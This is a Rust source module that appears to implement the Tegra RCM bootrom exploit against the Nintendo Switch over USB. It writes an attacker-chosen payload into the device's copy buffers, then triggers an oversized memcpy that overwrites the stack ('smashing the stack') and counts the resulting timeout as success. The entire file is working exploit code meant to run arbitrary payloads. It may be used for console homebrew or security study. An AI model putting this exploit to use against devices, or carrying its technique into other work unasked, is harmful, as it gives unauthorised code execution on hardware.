use thiserror::Error;

use crate::device::{SwitchDevice, SwitchDeviceUninit, SwitchDeviceUninitError};
use crate::vulnerability::Vulnerability;
use crate::Payload;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum BufferState {
    High,
    Low,
}

impl BufferState {
    fn toggle(&mut self) {
        match self {
            BufferState::High => *self = BufferState::Low,
            BufferState::Low => *self = BufferState::High,
        }
    }

    fn address(&self) -> usize {
        const COPY_BUFFER_ADDRESSES_LOW: usize = 0x40005000;
        const COPY_BUFFER_ADDRESSES_HIGH: usize = 0x40009000;
        match *self {
            BufferState::Low => COPY_BUFFER_ADDRESSES_LOW,
            BufferState::High => COPY_BUFFER_ADDRESSES_HIGH,
        }
    }
}

#[derive(Debug, Error)]
pub enum RcmError {
    #[error("Expected timeout error after smashing the stack")]
    ExpectedError,
    #[error("A usb error")]
    UsbError(rusb::Error),
}

impl From<rusb::Error> for RcmError {
    fn from(err: rusb::Error) -> Self {
        Self::UsbError(err)
    }
}

pub struct Rcm {
    switch: SwitchDevice,
    current_buffer: BufferState,
    _total_written: usize,
}

impl Rcm {
    pub fn new(wait: bool) -> Result<Self, SwitchDeviceUninitError> {
        let switch = SwitchDeviceUninit::default().find_device(wait)?;

        Ok(Self {
            switch,
            current_buffer: BufferState::Low,
            _total_written: 0,
        })
    }

    pub fn execute(&mut self, payload: Payload) -> Result<(), RcmError> {
        self.write(payload.data())?;
        self.switch_to_highbuf()?;

        // smashing the stack

        let res = self.trigger_controlled_memcopy();
        // We expect a timeout
        if let Err(err) = res {
            if err == rusb::Error::Timeout {
                return Ok(());
            }
        }
        Err(RcmError::ExpectedError)
    }

    /// Writes data to the RCM protocol endpoint
    fn write(&mut self, buf: &[u8]) -> rusb::Result<usize> {
        const PACKET_SIZE: usize = 0x1000;
        const MAX_LENGTH: usize = 0x30298;

        assert!(buf.len() <= MAX_LENGTH);

        let mut remaining_buf = buf;
        let mut length_remaining = buf.len();

        let mut written = 0;

        while length_remaining != 0 {
            let data_to_transmit = length_remaining.min(PACKET_SIZE);
            length_remaining -= data_to_transmit;

            let chunk = &remaining_buf[..data_to_transmit];
            remaining_buf = &remaining_buf[data_to_transmit..];
            match self.write_buffer(chunk) {
                Ok(size) => written += size,
                Err(e) => return Err(e),
            };
        }

        Ok(written)
    }

    fn current_buff_addr(&self) -> usize {
        self.current_buffer.address()
    }

    fn switch_to_highbuf(&mut self) -> rusb::Result<()> {
        if self.current_buffer != BufferState::High {
            let buf = &[b'\0'; 0x1000];
            self.write(buf)?;
        }
        Ok(())
    }

    fn trigger_controlled_memcopy(&self) -> rusb::Result<usize> {
        const STACK_END: usize = 0x40010000;
        let length = STACK_END - self.current_buff_addr();
        self.trigger_controlled_memcopy_length(length)
    }

    fn trigger_controlled_memcopy_length(&self, length: usize) -> rusb::Result<usize> {
        self.switch.trigger(length)
    }

    fn write_buffer(&mut self, buf: &[u8]) -> rusb::Result<usize> {
        self.toggle_buffer();
        self.switch.write(buf)
    }

    fn toggle_buffer(&mut self) {
        self.current_buffer.toggle();
    }

    fn read(&mut self, buf: &mut [u8]) -> rusb::Result<usize> {
        self.switch.read(buf)
    }

    fn read_device_id(&mut self) {
        let mut buf = [b'\0'; 16];
        self.read(&mut buf).unwrap();
    }
}
